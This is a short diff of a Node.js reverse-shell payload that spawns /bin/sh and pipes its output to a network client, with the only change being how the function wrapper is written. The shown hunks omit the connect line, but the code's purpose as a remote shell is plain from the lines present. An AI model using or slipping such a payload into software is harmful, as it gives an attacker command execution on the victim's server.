@@ -1,4 +1,4 @@
-(function(){
+function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
@@ -9,4 +9,4 @@
         sh.stderr.pipe(client);
     });
     return /a/; // Prevents the Node.js application form crashing
-})();
+}();
